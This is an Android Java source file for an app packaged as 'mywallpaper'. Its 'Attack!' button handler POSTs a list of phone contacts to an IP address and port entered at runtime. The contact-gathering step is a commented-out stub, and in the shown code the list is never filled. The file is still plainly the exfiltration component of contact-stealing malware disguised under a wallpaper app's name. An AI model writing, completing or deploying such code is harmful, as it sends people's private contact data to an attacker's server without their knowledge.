package com.example.mywallpaper;

import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

public class MainActivity extends Activity {
	Button getContacts;
	ArrayList<String> sendToServer;
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();
		if (id == R.id.action_settings) {
			return true;
		}
		return super.onOptionsItemSelected(item);
	}
	
	/** Called when the user clicks the Get Contacts button */
	public void getContacts(View view) {
		// TODO get contacts from service
/*		Intent startIntent = new Intent();
		startIntent.setAction("android.intent.action.MAIN");
		startActivity(startIntent);
		
		startIntent = null ;
		startIntent = new Intent();   
		startIntent.setAction("android.intent.action.MCSendService") ;      
        stopService(startIntent);
        startService(startIntent);*/
		
	}
	
	/** Called when the user clicks the Attack! button */
	public void attackByIP(View view) {
		// send contacts data to server
    	EditText ipAddress = (EditText) findViewById(R.id.ipAddress);
    	EditText port = (EditText) findViewById(R.id.port);
    	String attackAddress = "http://" + ipAddress.getText().toString() + ":" + port.getText().toString();
    	
    	if (null != sendToServer) {
    		postContactList(attackAddress, sendToServer);
    	} else {
    		Toast.makeText(this, "No Contacts Data Found!", Toast.LENGTH_LONG).show();
    	};
	}
	
	private void postContactList(String attackAddress, ArrayList<String> contactList) {
		// Create a new HttpClient and Post Header
        HttpClient httpclient = new DefaultHttpClient();
        HttpPost httppost = new HttpPost(attackAddress);
    	List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
    	for (String contact : contactList) {
    		nameValuePairs.add(new BasicNameValuePair("contact[]", contact));
    	}
    	try {
			httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
			HttpResponse response = httpclient.execute(httppost);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
